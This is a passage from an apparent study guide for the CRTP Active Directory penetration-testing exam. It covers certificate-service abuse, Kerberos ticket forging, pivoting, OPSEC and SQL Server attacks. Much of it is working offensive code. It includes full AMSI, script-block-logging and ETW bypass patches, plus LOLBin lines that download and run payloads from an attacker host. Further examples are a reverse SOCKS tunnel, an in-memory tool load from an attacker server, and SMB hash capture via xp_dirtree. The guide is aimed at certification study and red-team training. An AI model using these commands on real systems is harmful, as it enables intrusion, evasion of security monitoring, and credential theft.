   - All admin passwords changed
   - MFA mandatory
   - PAWs deployed

2. **Enhanced monitoring:**
   - Microsoft Defender for Identity
   - SIEM rules updated
   - Threat hunting active

3. **Tier model enforcement:**
   - If not already implemented
   - Cross-tier credential prevention

4. **Network segmentation:**
   - Isolate DCs
   - Restrict admin paths

5. **Lessons learned:**
   - Root cause analysis
   - Process improvements
   - Tools deployed
   - Training enhanced

**Possible "burn it down" scenarios:**

If Golden Tickets, deep persistence, or DC compromise:
- May need new forest
- Migration to clean environment
- Multi-month project

**Forest recovery:**

Microsoft has documented forest recovery procedure:
- Recover one DC first
- Validate domain
- Bring online other DCs
- Carefully restore trust relationships

**Compromise indicators that require this:**

- KRBTGT compromise (even after rotation)
- AdminSDHolder corruption
- Multiple persistent footholds
- DC physical access
- Confidence in DC integrity lost

**For your career:**

If you ever respond to AD compromise (defensive):
- This is a multi-month project
- Specialized consultants ($100K+)
- Business impact severe
- Career-defining incident

### Q54: ADCS attacks (ESC1-8 most common)
**A:**

**ESC1: Misconfigured Certificate Template**

Conditions:
- Low-privilege users can enroll
- Template allows custom Subject Alternative Name (SAN)
- Has Client Authentication EKU

Attack:
```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request cert as any user
.\Certify.exe request /ca:CA.corp.local\corp-CA-CA /template:VulnTemplate /altname:Administrator

# Output: .pfx file

# Use cert for Kerberos auth
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:CertPass /ptt
```

Result: TGT as Administrator.

**ESC2: Template Has Any Purpose**

EKU contains "Any Purpose" or no EKU = certificate usable for everything including auth.

Same exploit as ESC1.

**ESC3: Enrollment Agent**

Templates that allow you to be "Enrollment Agent" - request certificates on behalf of others.

**ESC4: Vulnerable Template Access Control**

You have write access to a template object. Modify template to make it vulnerable (e.g., set Mode=1 to allow SAN).

```powershell
# Modify template ACL
.\Certify.exe pkiobjects

# Then modify template
.\Certify.exe write /template:Target /enable
```

**ESC5: Vulnerable PKI Object Access Control**

ACL issues on:
- CA object in AD
- Certificate templates
- NTAuthCertificates store

**ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2**

CA flag set: ANY template accepts SAN regardless of template config.

```powershell
# Check
.\Certify.exe cas

# If flag set, any template you can enroll is vulnerable
```

**ESC7: Vulnerable CA Access Control**

You're admin on the CA itself:
- Issue certificates manually
- Modify CA configuration
- Add yourself as Certificate Manager

**ESC8: NTLM Relay to AD CS HTTP**

AD CS has HTTP Web Enrollment endpoint vulnerable to NTLM relay.

```bash
# Coerce victim authentication
.\PetitPotam.exe attacker DC

# Relay to ADCS HTTP endpoint
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"
```

Result: Certificate as DC$ → use for Kerberos auth → DCSync.

**ESC9-15+:** Newer techniques.

**Detection:**

- Certify/Certipy tool indicators
- Unusual certificate enrollments
- Certificates issued to admin accounts
- HTTP coercion attempts (PetitPotam)
- ADCS event logs

**Defense:**

1. **Audit templates** with Certify/Certipy

2. **Disable EDITF_ATTRIBUTESUBJECTALTNAME2:**
```cmd
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

3. **Restrict template enrollment**

4. **Disable HTTP Web Enrollment** if not needed

5. **Enable EPA on IIS**

6. **Patch:** CVE-2022-26923 (Certifried)

7. **Monitor:** ADCS event logs

**Tools:**

- **Certify** (Windows, C#)
- **Certipy** (Linux, Python)
- **PSPKIAudit** (defense)

**For your career:**

ADCS attacks beyond CRTP but increasingly common in real engagements. Often unaddressed in enterprises.


## SECTION B CONTINUED: ATTACK TECHNIQUES (Q55-65)

### Q55: AD lab environment setup for practice
**A:**

**Building your own AD lab:**

**Option 1: Local virtual lab**

Requirements: 32GB+ RAM, 500GB+ disk, VMware/VirtualBox

VMs needed:
- 1 Domain Controller (Server 2019/2022)
- 1-2 Member servers (Server 2019)
- 2-3 Workstations (Windows 10/11)
- 1 Kali Linux (attacker)

**Option 2: Cloud lab**

- Azure: $200/month free credit
- AWS: Free tier
- Hetzner: Cheap dedicated
- Vultr: VPS

**Option 3: Lab platforms**

- **TryHackMe** - "Wreath" network, AD rooms (you have access)
- **HackTheBox Pro Labs** - Dante, Cybernetics, Offshore, RastaLabs
- **Pentester Academy CRTP labs** (the official one)
- **VulnLab** - Modern AD scenarios
- **GOAD (Game of Active Directory)** - Free, deployable
- **AltSec GOAD** - Pre-built vulnerable AD

**GOAD setup (recommended - free):**

```bash
# Clone repo
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD

# Install requirements
sudo apt install vagrant ansible

# Choose lab
./goad.sh -t install -l GOAD -p virtualbox

# Wait 1-2 hours for build
```

GOAD includes:
- 2 forests, 3 domains
- 25+ pre-configured vulnerabilities
- Kerberoasting, ASREP, ACL abuse
- ADCS attacks
- Trust attacks

**Building from scratch manually:**

**Step 1: Setup DC**
1. Install Windows Server 2019
2. Set static IP
3. Install AD DS role
4. Promote to DC, domain: corp.local

**Step 2: Configure intentional vulnerabilities**

```powershell
# Create Kerberoastable service account
$pass = ConvertTo-SecureString "Spring2024!" -AsPlainText -Force
New-ADUser -Name "svc_sql" -AccountPassword $pass -Enabled $true
Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/sqlserver.corp.local:1433"}

# Create AS-REP roastable user
New-ADUser -Name "asrep_user" -AccountPassword $pass -Enabled $true
Set-ADAccountControl -Identity asrep_user -DoesNotRequirePreAuth $true

# Weak ACL: user1 has GenericAll on user2
$acl = Get-ACL "AD:CN=user2,CN=Users,DC=corp,DC=local"
$identity = [System.Security.Principal.NTAccount]"corp\user1"
$rights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type = [System.Security.AccessControl.AccessControlType]::Allow
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $type)
$acl.AddAccessRule($ace)
Set-ACL "AD:CN=user2,CN=Users,DC=corp,DC=local" $acl

# Server with unconstrained delegation
Set-ADAccountControl -Identity SERVER1 -TrustedForDelegation $true

# Service account in Domain Admins (huge escalation path)
New-ADUser -Name "svc_backup" -AccountPassword $pass -Enabled $true
Add-ADGroupMember "Domain Admins" -Members svc_backup
```

**Step 3: Drop legacy artifacts**

- Create old GPP Groups.xml with cPassword in SYSVOL
- Plant credentials in batch scripts
- Leave .ps1 with hardcoded passwords

**Step 4: Add member machines and login users locally to populate cached creds**

**Kali tools to have ready:**

```bash
# Standard arsenal
sudo apt install -y crackmapexec evil-winrm bloodhound python3-bloodhound responder kerbrute

# Updated Impacket
pip install impacket --upgrade

# Additional tools
git clone https://github.com/SpiderLabs/Responder
git clone https://github.com/SecureAuthCorp/impacket
git clone https://github.com/dirkjanm/PKINITtools
git clone https://github.com/ly4k/Certipy
```

**For your Encrypticle content:**

Build labs for students:
- Pre-configured vulnerable AD
- Step-by-step walkthroughs
- Multiple attack paths
- Bug Bounty Pro Cohort V2 could include AD module if you expand scope

Resell as lab access (monthly subscription model).

### Q56: CRTP exam strategy
**A:**

**CRTP exam structure (Altered Security):**

- **24 hours** of lab access for exam
- **5 machines** to compromise
- **Domain Admin or equivalent** required on each network/forest
- **48 hours** to submit detailed report after lab time ends
- Open book, internet allowed
- No restrictions on tools

**Pre-exam knowledge required:**

1. PowerShell fundamentals
2. AD enumeration (PowerView, AD module)
3. Kerberos attacks (Kerberoasting, ASREP, delegation)
4. ACL abuse
5. Mimikatz comfort
6. Trust attacks (parent-child, cross-forest)
7. Persistence (Golden, Silver, Skeleton)

**Tools to have ready (locally, not internet-dependent):**

- PowerSploit / PowerView.ps1
- Invisi-Shell (AMSI bypass)
- Mimikatz.exe
- Rubeus.exe
- SharpHound.exe + BloodHound.exe + Neo4j
- AD Module DLL (Microsoft.ActiveDirectory.Management.dll)
- ADSearch.exe
- Powermad.ps1
- SharpAllowedToAct.exe
- AMSI bypass scripts

**Exam timeline (recommended split):**

**Hours 0-2: Enumeration**
- AD module + PowerView dumps
- BloodHound collection
- Map domain, find users, groups, computers, ACLs
- Identify high-value targets

**Hours 2-4: First compromise**
- Find initial path (often Kerberoasting or ASREP)
- Crack hashes
- Get foothold

**Hours 4-10: Lateral movement**
- Move through machines
- Collect more credentials
- Map attack paths in BloodHound

**Hours 10-16: Privilege escalation to DA**
- Execute highest-value attack chain
- Get Domain Admin on parent
- DCSync to get all hashes

**Hours 16-20: Trust attacks**
- Enumerate forest trusts
- Cross-forest escalation
- Get Enterprise Admin

**Hours 20-24: Buffer + screenshots**
- Re-verify all access
- Take screenshots for report
- Document attack paths

**Exam tips:**

1. **Screenshot everything as you go** - you'll forget what worked
2. **Note credentials immediately** when found (in single text file)
3. **Take regular breaks** - 24 hours is exhausting
4. **Sleep at hour 12** - 6 hours sleep, return fresh
5. **BloodHound first, attack second** - paths visible saves hours
6. **AMSI bypass before loading PowerView** - or it gets blocked
7. **Use AD module when PowerView blocked** - same data, less detection
8. **Trust map early** - cross-domain attacks need this info
9. **Don't get stuck** - if 1 hour on something, try different path
10. **Persistence not required** for CRTP - focus on access

**Common stuck points:**

- AMSI blocking PowerView → use AD module
- BloodHound not showing paths → try -CollectionMethod All
- DCSync failing → check rights, try different account
- Trust ticket not working → verify SID, check encryption

**Report requirements:**

- Executive summary
- Attack narrative (chronological)
- Technical details per finding
- Screenshots as evidence
- Remediation recommendations
- Tools used

Report typically 30-60 pages with screenshots.

**Common reasons people fail:**

1. Bad report quality (cleared lab but report unclear)
2. Don't reach all 5 machines
3. Miss forest privilege escalation
4. Spend too long on one path
5. Don't sleep, make tired mistakes

**Pass rate:** ~80% pass on first attempt with proper prep. Lab access is the key prep.

### Q57: Specific CRTP-style scenarios
**A:**

**Scenario 1: Kerberoasting → DA**

Path:
1. Enumerate, find user with SPN
2. Kerberoast that user
3. Crack hash (weak password)
4. Login as service account
5. Service account is local admin somewhere
6. Mimikatz → find DA token in memory
7. Pass-the-ticket as DA
8. DCSync

**Scenario 2: ACL Abuse → DA**

Path:
1. BloodHound shows shortest path
2. You have GenericWrite on user X
3. Set SPN on user X
4. Kerberoast user X
5. Crack X's password
6. X is member of a group with GenericAll on Domain Admins
7. Add yourself to Domain Admins
8. DCSync

**Scenario 3: Unconstrained Delegation → DA**

Path:
1. Find member server with unconstrained delegation
2. Get local admin on that server (password reuse)
3. Mimikatz on server
4. SpoolSample force DC to authenticate
5. Capture DC$ TGT in memory
6. PtT as DC$
7. DCSync

**Scenario 4: Trust Abuse → EA**

Path:
1. Have DA in child.parent.local
2. Get child KRBTGT hash via DCSync
3. Get parent SID
4. Create Golden Ticket with SID History pointing to parent EA SID
5. Use ticket → Enterprise Admin on entire forest

**Scenario 5: GPP cPassword → Local Admin → DA**

Path:
1. Browse SYSVOL
2. Find Groups.xml with cPassword
3. Decrypt cPassword (PowerView Get-GPPPassword)
4. Local admin password works on multiple machines (LAPS not used)
5. Find DA logged into one of them
6. Extract DA credentials
7. DCSync

**Scenario 6: Constrained Delegation Abuse**

Path:
1. Find user with constrained delegation to MSSQLSvc
2. Compromise that user's credentials
3. S4U to MSSQLSvc as Administrator
4. SQL access as Administrator → xp_cmdshell
5. SYSTEM on SQL server
6. SQL server has SPN with TrustedToAuth + protocol transition
7. Can impersonate anyone → DC$ → DCSync

**Scenario 7: RBCD attack**

Path:
1. You have GenericWrite on a server (via group membership)
2. Create computer account (MachineAccountQuota = 10)
3. Set RBCD: your computer can delegate to target server
4. S4U as Administrator to CIFS on target
5. Local admin on target → continue chain

**Scenario 8: ACLs through nested groups**

Path:
1. You're in group A
2. Group A is member of group B
3. Group B is member of group C
4. Group C has GenericWrite on Domain Admins group
5. Add yourself to DA

**Scenario 9: Multi-domain chain**

Path:
1. Compromise user in child.parent.local
2. Find trust to dev.parent.local (sibling)
3. Enumerate cross-trust
4. Find ACL abuse in dev
5. Become DA of dev
6. From dev, find trust to parent
7. Become EA via SID History

**Scenario 10: ADCS path (CRTP-Advanced/CRTE)**

Path:
1. Enumerate ADCS templates with Certify
2. Find ESC1 vulnerable template
3. Request cert as Administrator with SAN
4. Use cert with Rubeus → TGT as Administrator
5. DCSync

**For your exam:**

Lab has multiple intended paths. Pick paths you're comfortable with, but explore all to ensure complete coverage of 5 machines.

### Q58: Pivoting and tunneling for AD attacks
**A:**

**Why pivoting needed:**

CRTP and real engagements: target deeper networks not directly accessible. Need to route through compromised hosts.

**Tools and techniques:**

**1. Chisel (most common, modern):**

Setup tunnel from compromised host back to attacker:

```bash
# On Kali (attacker)
./chisel server -p 8000 --reverse

# On compromised Windows host
chisel.exe client attacker_ip:8000 R:1080:socks
```

Now port 1080 on Kali = SOCKS proxy through compromised host.

**Use with proxychains:**

```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Then
proxychains psexec.py corp.local/user:pass@deep_target.corp.local
proxychains crackmapexec smb internal_subnet/24
```

**2. SSH tunneling:**

If SSH access to Linux jump box:

```bash
# Local port forward
ssh -L 1080:internal_host:445 user@jumpbox

# Dynamic SOCKS
ssh -D 1080 user@jumpbox

# Reverse tunnel
ssh -R 8080:internal_host:80 attacker@kali
```

**3. ngrok / port forwarding:**

When you have no inbound access:

```bash
# Reverse shell over ngrok
ngrok tcp 4444

# Listener uses ngrok endpoint
```

**4. SOCKS via Meterpreter:**

```
meterpreter > run autoroute -s 10.10.20.0/24
meterpreter > background

msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > run
```

**5. SOCKS via Cobalt Strike:**

```
beacon> socks 1080
```

**6. Native Windows pivoting:**

```cmd
# Port forward via netsh
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal_host

# Required: admin on pivot host
```

**7. Plink (PuTTY's CLI SSH):**

For Windows pivots without SSH:

```cmd
plink.exe -l user -pw pass -R 8080:localhost:8080 attacker_ip
```

**Multi-hop pivoting:**

```
Attacker → Host A → Host B → Host C (target)
```

```bash
# On Kali
chisel server -p 8000 --reverse

# On Host A (first pivot)
chisel client attacker:8000 R:1080:socks

# Inside SOCKS, run another chisel
proxychains chisel server -p 8001 --reverse

# On Host B
chisel client hostA:8001 R:1081:socks
```

Now have two SOCKS proxies: 1080 (via A), 1081 (via A then B).

**DNS tunneling (when other protocols blocked):**

Tools:
- iodine
- dnscat2

Slow but works through restrictive firewalls.

**For CRTP:**

You may need pivoting if exam network is segmented. Practice chisel + proxychains setup in lab.

### Q59: OPSEC for AD attacks
**A:**

**OPSEC = Operational Security. Avoid detection during attacks.**

**Common detection triggers:**

**1. Tool signatures:**
- Mimikatz binary signature
- PowerView function names
- Rubeus binary
- BloodHound collection patterns
- Impacket user-agent strings

**Defense bypass:**
- Use AV-evasion versions
- Custom obfuscation
- Living off the land (LOLBins)
- Built-in tools when possible

**2. PowerShell logging:**

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"

Block AMSI before loading scripts:
```powershell
# Various AMSI bypasses
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or use PowerShell v2 (no AMSI)
powershell -version 2
```

**3. Event logs:**

Critical event IDs that fire:
- 4624 logon
- 4625 failed logon  
- 4634 logoff
- 4648 explicit credential use
- 4672 special privileges
- 4720 account created
- 4732 group membership added
- 4769 service ticket requested
- 5136 directory object modified

Reduce noise:
- Don't create unnecessary accounts
- Don't dump all hashes (just what you need)
- Don't run scanners at high speed
- Spread activity over time

**4. Network noise:**

- LDAP queries in bulk
- SMB connections to many hosts
- Kerberos ticket requests in burst
- LLMNR/NBT-NS poisoning visible

**Stealth techniques:**

**1. Use legitimate channels:**

```powershell
# WinRM looks like normal admin activity
Enter-PSSession -ComputerName target

# vs PsExec which creates service (loud)
```

**2. Run as legitimate users:**

Don't create attacker_user. Use existing service accounts.

**3. Time activities:**

Run scans during business hours (mixed with legit traffic).
Don't run at 3 AM (anomalous).

**4. Geographic patterns:**

If your VPN exit is unusual:
- Use VPN to expected country
- Use cloud server in expected region

**5. Avoid honey items:**

Defenders deploy:
- Honey users with weak passwords
- Honey SPNs
- Honey shares with canary tokens

If you see "admin_test" with `Password123`, might be a trap.

**6. Limit scope:**

Don't:
- Compromise everything
- Dump all NTDS
- Add many accounts to admin groups
- Create many tickets

Do:
- Get just what you need
- Surgical actions
- Clean up artifacts

**7. Use trusted parent processes:**

```cmd
# PowerShell launched from explorer.exe = normal
# PowerShell launched from word.exe = suspicious
```

**8. Avoid obfuscation that triggers detection:**

Ironically:
- Base64 encoding triggers alerts
- Heavy obfuscation triggers AMSI
- Sometimes plain works better than obfuscated

**9. Sleep between activities:**

```powershell
# Spread enumeration over hours
Start-Sleep -Seconds (Get-Random -Min 60 -Max 600)
```

**10. Don't generate impossible activity:**

User from Mumbai logging in from Russia = anomaly. Use VPN/proxy matching expected location.

**For CRTP:**

OPSEC doesn't matter (lab environment). But practice for real engagements.

**For real engagements:**

- Get clear scope and rules of engagement
- Coordinate with blue team if "purple team"
- Document everything
- Follow agreed timelines
- Stop if reaching dangerous activity

### Q60: AV/EDR evasion for AD attacks
**A:**

**Why evasion matters:**

Modern AV/EDR catches:
- Mimikatz signatures
- PowerView functions
- Empire/Cobalt Strike patterns
- Known exploit signatures

**Evasion techniques:**

**1. AMSI bypass:**

AMSI (Antimalware Scan Interface) scans PowerShell, scripts in memory.

```powershell
# Method 1: Patch amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Hardware breakpoint AMSI
# More advanced, less detected

# Method 3: Reflection
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "ScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

**2. PowerShell logging bypass:**

```powershell
# Bypass Script Block Logging
$logSetting = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
$logSetting.Remove("ScriptBlockLogging")
```

**3. Custom Mimikatz:**

Don't use stock mimikatz.exe. Use:
- **SharpKatz** - C# port, less detected
- **PypyKatz** - Python port
- **Custom builds** - rebuild from source with different signatures
- **In-memory loading** - reflective DLL injection

```powershell
# Reflective load
$Bytes = [System.IO.File]::ReadAllBytes("C:\mimikatz.exe")
[System.Reflection.Assembly]::Load($Bytes)
```

**4. Obfuscation:**

```powershell
# Invoke-Obfuscation tool
# Heavy string obfuscation
# Function renaming
# Variable mangling
```

But: heavy obfuscation itself triggers AMSI.

**5. Living off the Land (LOLBins):**

Use built-in Windows binaries:

```cmd
# Download files
certutil -urlcache -split -f http://attacker/file.exe c:\temp\file.exe
bitsadmin /transfer myDownload http://attacker/file.exe c:\temp\file.exe

# Execute
rundll32 c:\temp\evil.dll,EntryPoint
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
mshta http://attacker/file.hta
wmic process call create "powershell.exe -c command"
```

LOLBAS project: https://lolbas-project.github.io

**6. Process injection:**

Inject into trusted processes:

```powershell
# DInvoke - direct syscalls
# Process hollowing
# Thread injection
# Module stomping
```

**7. Sleep evasion:**

EDR samples processes:
- If sleeping when sampled → missed
- Encrypt memory between activities

```python
# Pyramid framework
# Sliver implant features
```

**8. Direct syscalls:**

Bypass userland hooks:

```powershell
# Tools: SysWhispers, FreshyCalls
# Call NT functions directly
# Bypass EDR API monitoring
```

**9. ETW bypass:**

ETW (Event Tracing for Windows) feeds EDR:

```powershell
# Patch ETW
$ETW = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null)
[Reflection.FieldInfo]$EventProvider = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
$EventProvider.SetValue($ETW, 0)
```

**10. Memory-only execution:**

Never touch disk:
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

But: ScriptBlock logging captures this.

**Tool recommendations for evasion:**

- **PowerShell Empire** - Built-in evasion
- **Sliver** - Modern C2 with evasion
- **Havoc** - Open source C2
- **Mythic** - Modular C2 framework
- **Brute Ratel** - Commercial alternative

**For CRTP:**

Lab has no AV. But knowing evasion helps real engagements.

**For your career:**

Red team specialization needs deep evasion knowledge. Path: CRTP → CRTE → OSEP (PEN-300) → C2 development.

### Q61: AS-REP roasting protected accounts
**A:**

**Protected Users group:**

Members of "Protected Users" get extra protections:
- No NTLM auth
- No DES, RC4 in Kerberos (only AES)
- TGT lifetime 4 hours max
- No delegation
- No credential caching

**Why this matters for ASREP:**

ASREP roasting works on RC4 because it's faster to crack. AES still works but takes much longer.

If account in Protected Users:
- ASREP request returns AES-encrypted response
- Much harder to crack
- Often infeasible

**Modern Kerberoasting against AES:**

```bash
# Hashcat AES256 TGS
hashcat -m 19700 hashes.txt rockyou.txt

# Speed (RTX 4090): ~100K guesses/sec vs RC4 1 billion/sec
```

Difference: 10,000x slower for AES.

**Bypass for ASREP on Protected Users:**

If account in Protected Users:
1. Look for accounts NOT in Protected Users
2. ACL abuse to remove from Protected Users (if you have rights)
3. Force user out of group temporarily

**Best practice for defenders:**

Add all admin accounts to Protected Users + remove RC4 support globally.

### Q62: Specific tools deep dive - Rubeus
**A:**

**Rubeus** = C# tool for Kerberos abuse (by Will Schroeder).

**Why preferred over Mimikatz for Kerberos:**

- Pure C# (in-memory load possible)
- More Kerberos-specific features
- Better OPSEC than mimikatz binary
- Active development

**Core commands:**

**1. Kerberoasting:**

```powershell
# Roast all SPN users
.\Rubeus.exe kerberoast

# Specific user
.\Rubeus.exe kerberoast /user:svc_sql

# Save to file
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Hashcat format (default)
.\Rubeus.exe kerberoast /format:hashcat

# John format
.\Rubeus.exe kerberoast /format:john

# Specific OU
.\Rubeus.exe kerberoast /ou:OU=ServiceAccounts,DC=corp,DC=local

# Cross-domain
.\Rubeus.exe kerberoast /domain:other.corp.local
```

**2. AS-REP Roasting:**

```powershell
# All ASREP-roastable
.\Rubeus.exe asreproast

# Specific user
.\Rubeus.exe asreproast /user:asrep_user

# Cross-domain
.\Rubeus.exe asreproast /domain:other.corp.local
```

**3. Get TGT:**

```powershell
# With password
.\Rubeus.exe asktgt /user:user /password:pass /domain:corp.local

# With NTLM hash
.\Rubeus.exe asktgt /user:user /rc4:HASH /domain:corp.local

# With AES key (more OPSEC)
.\Rubeus.exe asktgt /user:user /aes256:KEY /domain:corp.local

# Inject into current session
.\Rubeus.exe asktgt /user:user /rc4:HASH /ptt

# With certificate (PKINIT)
.\Rubeus.exe asktgt /user:user /certificate:cert.pfx /password:CertPass
```

**4. Pass-the-Ticket:**

```powershell
# Inject base64 ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# From file
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

**5. S4U attacks:**

```powershell
# S4U2Self + S4U2Proxy
.\Rubeus.exe s4u /user:rbcd_attack$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt
```

**6. Monitor for tickets:**

```powershell
# Watch for new tickets (good for unconstrained delegation attacks)
.\Rubeus.exe monitor /interval:5 /filteruser:DC$

# Output: Detects DC$ TGTs landing in memory
```

**7. Dump current tickets:**

```powershell
.\Rubeus.exe dump

# Filter
.\Rubeus.exe dump /service:krbtgt
.\Rubeus.exe dump /user:Administrator
```

**8. Golden Ticket:**

```powershell
.\Rubeus.exe golden /aes256:KRBTGT_AES /user:Administrator /id:500 /domain:corp.local /sid:S-1-5-21-... /ptt
```

**9. Silver Ticket:**

```powershell
.\Rubeus.exe silver /service:cifs/server.corp.local /rc4:HASH /user:Administrator /id:500 /domain:corp.local /sid:S-1-5-21-...
```

**10. Diamond Ticket:**

```powershell
# Modify existing TGT
.\Rubeus.exe diamond /tgtdeleg /krbtgt:HASH /user:Administrator /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520
```

**11. Renew tickets:**

```powershell
.\Rubeus.exe renew /ticket:TICKET /autorenew
```

**12. Force authentication (for relay):**

```powershell
.\Rubeus.exe createnetonly /program:cmd.exe /domain:corp.local /username:user /password:pass /ticket:TICKET
```

**Loading Rubeus in-memory:**

```powershell
# Avoid disk write
$Bytes = (New-Object Net.WebClient).DownloadData("http://attacker/Rubeus.exe")
$Assembly = [System.Reflection.Assembly]::Load($Bytes)
[Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
```

**For CRTP:**

Rubeus is your Kerberos workhorse. Master:
- Kerberoasting
- TGT requests with various formats
- PtT injection
- S4U for delegation attacks
- Golden/Silver creation

### Q63: SharpHound vs BloodHound.py
**A:**

**SharpHound** (Windows C# collector):

**Pros:**
- Comprehensive collection
- Local admin enumeration via direct API
- Session enumeration accurate
- LoggedOn user detection works
- Native LDAP queries efficient

**Cons:**
- Detected by AV (signatures)
- Requires Windows
- Visible network activity

**Usage:**

```powershell
# All collection
.\SharpHound.exe -CollectionMethod All

# Stealth
.\SharpHound.exe -CollectionMethod Default,ACL,SessionLoop

# Throttle
.\SharpHound.exe -CollectionMethod All -Throttle 5000 -Jitter 50

# Specific OU
.\SharpHound.exe -CollectionMethod All -SearchBase "OU=ServiceAccounts,DC=corp,DC=local"

# Exclude domain controllers
.\SharpHound.exe -CollectionMethod All --ExcludeDCs

# Loop sessions (catch more)
.\SharpHound.exe -CollectionMethod SessionLoop -Loop -LoopDuration 02:00:00
```

**Collection methods:**

- **Group** - Group memberships
- **LocalGroup** - Local admin enumeration
- **Session** - Logged in users
- **LoggedOn** - Current users on hosts
- **Trusts** - Domain trusts
- **ACL** - All ACLs
- **ObjectProps** - Object properties
- **Container** - OUs and containers
- **GPOLocalGroup** - GPO-based local admin
- **SPNTargets** - Kerberoastable
- **All** - Everything
- **Default** - Standard set

**Output:** Zip file with multiple JSON files. Import to BloodHound GUI.

**BloodHound.py** (Linux Python collector):

**Pros:**
- Run from Kali
- No Windows machine needed
- Less detected (Linux origin)
- LDAP-based (less noisy than SharpHound's local methods)

**Cons:**
- Limited collection (no local admin enumeration without auth)
- Misses some data SharpHound gets
- Different code path, different detection

**Usage:**

```bash
# Install
pip install bloodhound

# Run
bloodhound-python -c All -u user -p password -d corp.local -ns 10.10.10.10

# Specific methods
bloodhound-python -c Group,Trusts,DCOnly -u user -p password -d corp.local -ns 10.10.10.10

# Just DC (most stealth)
bloodhound-python -c DCOnly -u user -p password -d corp.local -ns 10.10.10.10
```

**BloodHound CE (Community Edition):**

New SpecterOps platform replacing legacy BloodHound:
- Web-based
- Better UI
- Real-time queries
- Native Cypher queries
- API access

**For CRTP:**

CRTP lab is Windows. SharpHound works fine.

**For real engagements:**

Pick based on your access:
- Have Windows beachhead → SharpHound
- Linux-based attack → BloodHound.py
- Stealth required → DCOnly methods

### Q64: AD attacks via SQL Server
**A:**

**SQL Server in AD context:**

SQL Server services run as accounts with Kerberos delegation. Often:
- Service account is Kerberoastable
- SQL Server has unconstrained or constrained delegation
- xp_cmdshell enabled
- Linked servers across domain

**Initial access paths:**

**1. Default credentials:**

```bash
# Test common SQL passwords
crackmapexec mssql 10.10.10.0/24 -u sa -p ''
crackmapexec mssql 10.10.10.0/24 -u sa -p 'sa'
crackmapexec mssql 10.10.10.0/24 -u sa -p 'admin'
```

**2. Kerberoast SQL service account:**

```powershell
.\Rubeus.exe kerberoast /domain:corp.local
# Find MSSQLSvc/* SPNs
```

**3. PowerUpSQL enumeration:**

```powershell
# Find SQL servers
Get-SQLInstanceDomain

# Test access
Get-SQLConnectionTest -Instance "sqlserver.corp.local"

# Audit current user
Invoke-SQLAudit -Instance "sqlserver.corp.local"
```

**Common attacks:**

**1. xp_cmdshell:**

If enabled and you have admin SQL:
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(...)"';
```

**2. Linked server abuse:**

```sql
-- Find linked servers
EXEC sp_linkedservers;

-- Run command on linked server
EXEC ('xp_cmdshell ''whoami''') AT [linkedserver];

-- Chain through multiple
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [hop2]') AT [hop1];
```

**3. UNC path injection (capture hash):**

```sql
-- Triggers SMB connection, captures NTLMv2 hash with Responder
SELECT * FROM OPENROWSET(BULK '\\attacker_ip\share\file.txt', SINGLE_CLOB) AS Contents;

-- Or
EXEC xp_dirtree '\\attacker_ip\share';
```

**4. Impersonation:**

```sql
-- List users you can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate
EXECUTE AS LOGIN = 'sa';

-- Now you're sa
```

**5. SQL Server as service account → DA:**

If SQL service account has DA rights:
- Kerberoast → crack → login
- Use SQL access for code execution
- Code execution as service account
- Service account is DA → game over

**6. Constrained delegation via SQL:**

If SQL Server has constrained delegation to other services:
